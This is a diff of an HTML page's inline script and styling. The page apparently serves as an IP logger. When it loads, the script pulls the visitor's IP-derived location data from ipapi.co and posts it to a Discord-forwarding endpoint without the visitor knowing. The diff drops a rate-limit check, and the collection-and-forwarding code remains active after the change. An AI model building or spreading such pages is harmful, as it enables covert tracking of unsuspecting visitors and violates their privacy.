@@ -21,7 +21,6 @@
             border-left: 5px solid #333;
             box-shadow: inset 0 0 10px rgba(0,0,0,0.05);
             word-break: break-all;
-            line-height: 1.4;
         }
         footer { background-color: #333; color: #fff; padding: 10px; text-align: center; position: fixed; bottom: 0; width: 100%; }
     </style>
@@ -41,14 +40,8 @@
     <script>
         async function getSystemData() {
             const log = document.getElementById("system-log");
-            
-            // 1. RATE LIMIT CONFIG (4 Seconds)
-            const lastSent = localStorage.getItem('last_log_sent');
-            const now = Date.now();
-            const cooldown = 4000; 
-
             try {
-                // Fetching from ipapi.co (HTTPS compatible for Vercel)
+                // Fetching from ipapi.co (Supports HTTPS for Vercel)
                 const response = await fetch("https://ipapi.co/json/");
                 const n = await response.json();
 
@@ -83,31 +76,19 @@
                     .map(([key, value]) => `${key}: ${value}`)
                     .join("\n");
 
-                // Update the screen text
                 log.textContent = output;
 
-                // 2. SEND TO DISCORD (Only if cooldown has passed)
-                if (!lastSent || (now - lastSent > cooldown)) {
-                    fetch("/api/discord", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ content: output }),
-                    })
-                    .then(() => {
-                        localStorage.setItem('last_log_sent', Date.now());
-                        console.log("✅ Data forwarded to Discord.");
-                    })
-                    .catch(() => console.log("⚠️ Discord API currently unreachable."));
-                } else {
-                    console.log("⏳ Rate Limit: Skipping Discord post (4s cooldown).");
-                }
+                // Vercel POST request
+                fetch("/api/discord", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: output }),
+                }).catch(() => console.log("Server endpoint not configured."));
 
             } catch (err) {
                 log.textContent = "CRITICAL ERROR: API Connection Refused. Check Ad-Blockers.";
             }
         }
-
-        // Run the function when the page loads
         getSystemData();
     </script>
 </body>
